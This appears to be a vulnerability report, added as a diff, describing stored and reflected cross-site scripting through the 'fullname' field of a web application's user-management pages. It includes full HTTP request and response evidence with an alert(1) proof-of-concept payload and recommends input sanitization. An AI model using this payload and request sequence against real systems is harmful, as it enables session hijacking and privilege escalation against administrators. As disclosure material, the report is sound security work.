@@ -1,0 +1,216 @@
+An authenticated malicious actor can create a new user and insert malicious XSS payload in the "fullname" field/parameter. During the creation process the payload will be executed. After successful user creation, when the user is going to be deleted by requesting the endpoint "/settings/usermanagement/confirmdelete", the payload is triggered. This also affects the "http://domain/state/audittrail" endpoint. This would result in privilege escalation or unauthorized actions execution in the context of the privileges user (e.g. admin).
+
+User Input Sanitization should be implemented for fixing this issue.
+
+
+Below, evidence is provided.
+
+
+Request 1:
+POST /settings/usermanagement/details HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 250
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/settings/usermanagement/details
+Cookie: ksp=-1470787542576358405
+Upgrade-Insecure-Requests: 1
+
+ksp_formID=form1&ksp_requestID=1&username=user&passworduser=passwd&retypepassworduser=passwd&role=role.3&timeout=5&fullname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&email=&mobile=&auxphone=&ksp_redirect=%2Fsettings%2Fusermanagement%2Fassemblysections
+
+
+
+Response 1:
+HTTP/1.1 302 Found
+Location: /settings/usermanagement/assemblysections
+Content-type: text/html
+Content-Length: 293
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Redirect</title></head>
+<body>
+<h1>Redirect</h1>
+<p>Redirect to:/settings/usermanagement/assemblysections</p>
+</body>
+</html>
+
+
+
+
+
+Reflected XSS
+=============
+
+Request 2:
+GET /settings/usermanagement/summary HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://1.1.1.1/settings/usermanagement/nodesvisibility
+DNT: 1
+Connection: close
+Cookie: ksp=-1470787542576358405
+Upgrade-Insecure-Requests: 1
+
+
+
+
+Response 2:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+
+........code..........
+........code..........
+
+<label>Role:</label>
+Guest
+<br/>
+</p>
+<p>
+<label>Session time:</label>
+5 min
+<br/>
+</p>
+<p>
+<label>Name:</label>
+<script>alert(1)</script>
+<br/>
+</p>
+<p>
+<label>Email:</label>
+
+<br/>
+</p>
+<p>
+<label>Mobile phone (SMS):</label>
+
+<br/>
+</p>
+<p>
+<label>Alternative phone#:</label>
+
+........code..........
+........code..........
+
+</html>
+
+
+
+Stored XSS
+==========
+
+Request 3:
+POST /settings/usermanagement/start HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/settings/usermanagement/start
+Cookie: ksp=1907199093878124930
+Upgrade-Insecure-Requests: 1
+
+ksp_formID=form4&ksp_requestID=1&form_sl3=test&ksp_redirect=%2Fsettings%2Fusermanagement%2Fconfirmdelete
+
+
+
+Response 3:
+HTTP/1.1 302 Found
+Location: /settings/usermanagement/confirmdelete
+Content-type: text/html
+Content-Length: 290
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Redirect</title></head>
+<body>
+<h1>Redirect</h1>
+<p>Redirect to:/settings/usermanagement/confirmdelete</p>
+</body>
+</html>
+
+
+
+Request 4:
+GET /settings/usermanagement/confirmdelete HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://1.1.1.1/settings/usermanagement/start
+DNT: 1
+Connection: close
+Cookie: ksp=1907199093878124930
+Upgrade-Insecure-Requests: 1
+
+
+
+
+Response 4:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"> 
+
+........code........
+....................
+
+<div class="ui-widget-content">
+<span class="sectionDescription">
+
+Delete user user
+
+</span>
+
+<span class="submenuHeader">
+The following user will be deleted
+</span>
+<form action="" method="post" class="form width_100"><div><input type="hidden" name="ksp_formID" value="form1" /><input type="hidden" name="ksp_requestID" value="1" /></div>
+<label>User:</label>
+<b>   user</b>
+<br/>
+<label>  Name:</label>
+<b>   <script>alert(1)</script></b>
+<br/>
+<br/>
+<div class="buttonpane">
+<a href="/settings/usermanagement/start">
+<input type="button" value="< back" onClick="self.location.href='/settings/usermanagement/start'" id="back"  class="ui-button ui-widget ui-state-default ui-corner-all"/>
+</a>
+<input type="hidden" name="ksp_redirect" value="/settings/usermanagement/delete" /><input type="submit" value="delete!" class="ui-button ui-widget ui-state-default ui-corner-all" />
+</div>
+</form>
+
+</div>
+
+........code........
+....................
+
+
+
+</html> 
